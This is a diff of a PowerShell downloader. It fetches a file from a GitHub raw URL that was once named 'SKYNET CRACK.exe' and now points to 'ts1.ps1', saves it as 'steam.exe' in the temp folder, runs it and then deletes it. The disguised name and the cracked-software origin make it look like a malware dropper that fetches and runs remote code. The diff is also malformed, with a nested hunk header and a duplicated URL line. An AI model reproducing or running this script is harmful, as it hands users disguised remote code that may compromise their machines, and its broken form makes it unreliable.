@@ -1,13 +1,15 @@
-$url = "https://raw.githubusercontent.com/yuri95166-a11y/ddd/main/SKYNET%20CRACK.exe"
+@@ -1,63 +1,63 @@
+$url = "https://raw.githubusercontent.com/yuri95166-a11y/ddd/main/ts1.ps1"
+$url = "https://raw.githubusercontent.com/yuri95166-a11y/ddd/main/ts1.ps1"
 
 $tempPath = Join-Path $env:TEMP "steam.exe"
 
 Write-Host "Downloading..." -ForegroundColor Cyan
 
 try {
-    Invoke-WebRequest 
-        -Uri $url 
-        -OutFile $tempPath 
+    Invoke-WebRequest `
+        -Uri $url `
+        -OutFile $tempPath `
         -ErrorAction Stop
 
     if (Test-Path $tempPath) {
@@ -39,17 +41,17 @@ try {
 
         Write-Host "Launching installer..." -ForegroundColor Green
 
-        Start-Process 
-            -FilePath $tempPath 
+        Start-Process `
+            -FilePath $tempPath `
             -Wait
 
         Write-Host "AFTER INSTALLER" -ForegroundColor Magenta
 
         Write-Host "Cleaning temporary files..." -ForegroundColor Yellow
 
-        Remove-Item 
-            -Path $tempPath 
-            -Force 
+        Remove-Item `
+            -Path $tempPath `
+            -Force `
             -ErrorAction SilentlyContinue
 
         Write-Host "Completed." -ForegroundColor Green
@@ -59,5 +61,5 @@ try {
     }
 }
 catch {
-    Write-Host "Error: $($.Exception.Message)" -ForegroundColor Red
+    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
 }
